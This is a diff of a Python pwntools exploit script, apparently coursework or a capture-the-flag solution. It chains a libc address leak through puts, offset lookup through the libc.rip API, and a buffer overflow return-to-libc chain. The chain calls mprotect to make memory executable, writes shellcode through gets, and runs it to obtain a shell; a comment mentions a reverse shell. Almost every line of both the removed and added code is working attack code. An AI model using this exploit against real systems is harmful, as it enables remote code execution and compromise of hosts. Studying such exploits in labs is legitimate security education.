@@ -26,7 +26,6 @@ shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x
 redirectStdErr = True
 
 HEADERS = {'Content-Type': 'application/json'}
-# (Baumstark, 2020)
 FIND_LIBC_URL = 'https://libc.rip/api/find'
 libcSearchUrl = "https://libc.rip/api/libc/"
 
@@ -44,11 +43,13 @@ def leak_via_puts(conn, port,puts_got_addr):
     log.success(f"Leaked address of puts: {hex(puts_addr)}")
     return puts_addr
 
+
 def skip_lines(proc, lines):
     for _ in range(lines):
         proc.recvline(timeout=0.05)
 
-def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff):
+
+def attemptR2Libc_shellcode(putsOffset, mprotectOff):
     # Leak randomised libc puts addr
     putsAddr = leak_via_puts(conn, port, gotPuts)
 
@@ -56,42 +57,24 @@ def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff):
     libc_address = putsAddr - putsOffset
     log.success(f'LIBC base: {hex(libc_address)}')
     
-    
     codeAddr = libc_address
     
-    # Execute mprotect(&codeaddr, 0x21000, PROT_READ (0x1) | PROT_WRITE (0x2) | PROT_EXEC (0x4)) 
-    # This allows the program to write to and execute the address found above
     #https://man7.org/linux/man-pages/man2/mprotect.2.html (Free Software Foundation, 2018)
-    payload = flat(
-        b'C' * BUFF_SIZE,                # Padding so the next bytes will overwrite the EIP
-        p32(mprotectOff+libc_address),  # Overflowed function will execute mprotect() on return
-        MAIN_ADDR,                       # mprotect will execute main() on return to facilitate subsequent buffer overflows
-        p32(codeAddr>>0xc<<0xc),        # mprotect's first pararmter, the start address where the memory protections are changed
-                                        # Being the code address gained above with the last 3 bytes set to 0x00
-        p32(0x21000),                   # mprotect's second pararmter, the number of bytes after that address to change protections on
-                                        # With 0x21000 being sufficiently large as to make sure any shellcode can be executed
-        p32(0x7)                        # mprotect's third pararmter, the protection value to change on those addresses
-                                        # Which is Read-Write-Execute: PROT_READ (0x1) | PROT_WRITE (0x2) | PROT_EXEC (0x4) = 0x7
-    )
+    payload = b'A' * BUFF_SIZE + p32(mprotectOff+libc_address) + p32(MAIN_ADDR) + p32(codeAddr>>0xc<<0xc) + p32(0x21000) + p32(0x7)
+
     proc.sendline(payload)
     log.success(f"Changed protections for {hex(codeAddr>>0xc<<0xc)}-{hex((codeAddr>>0xc<<0xc)+0x21000)} to RWX with mprotect")
 
     # Write shellcode payload to the address found above now changed to be writeable and executable using gets(&codeAddr)
     # Then execute that shellcode upon return of that gets()
-    payload = flat(
-        b'D' * BUFF_SIZE, # Padding so the next bytes will overwrite the EIP
-        pltGets,         # Overflowed function will execute gets() on return
-        codeAddr,        # gets will execute shellcode on return. This is the payload execution
-        codeAddr         # The input to gets will be written to the address found above
-    )
+    payload = b'A' * BUFF_SIZE + p32(pltGets) + p32(codeAddr) + p32(codeAddr)
+
     proc.sendline(payload)
     log.success(f"Called gets({hex(codeAddr)}) with {hex(codeAddr)} as return addr")
 
     # Input shellcode to gets so it is written to 'codeAddr' and then executed on return
-    payload = flat(
-        b'\x90'*20,
-        shellcode
-    )
+    payload = b'\x90'*20 + shellcode
+
     proc.sendline(payload)
     log.success(f"Sent shellcode to {hex(codeAddr)} via gets")
 
@@ -105,7 +88,6 @@ def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff):
             output+=currline
         except:
             break
-    #print(output)
     
     # Check if reverse shell was spawned then handle user input and output for the process
     return handle_reverse_shell()
@@ -150,12 +132,11 @@ def getLibcSymbolOffsets(libcJson):
     systemOff = symbolJson['symbols'].get('system')
     exitOff = symbolJson['symbols'].get('exit')
     mprotectOff = symbolJson['symbols'].get('mprotect')
-    printfOff = symbolJson['symbols'].get('printf')
     bin_shOff = symbolJson['symbols'].get('str_bin_sh')
     print()
     log.info("Trying offsets for libc version: "+libId)
-    log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}, mprotect: {mprotectOff}, printf: {printfOff}")
-    return putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff
+    log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}, mprotect: {mprotectOff}")
+    return putsOff, systemOff, exitOff, bin_shOff, mprotectOff
 
 
 def main():
@@ -164,9 +145,9 @@ def main():
 
         for item in responseJson:
         # Get the symbol offsets for the specific libc version
-            putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff = getLibcSymbolOffsets(item)
+            putsOff, systemOff, exitOff, bin_shOff, mprotectOff = getLibcSymbolOffsets(item)
             
-            attemptR2Libc_shellcode(int(putsOff,16),int(mprotectOff,16),int(printfOff,16))
+            attemptR2Libc_shellcode(int(putsOff,16),int(mprotectOff,16))
 
 
 if __name__ == "__main__":
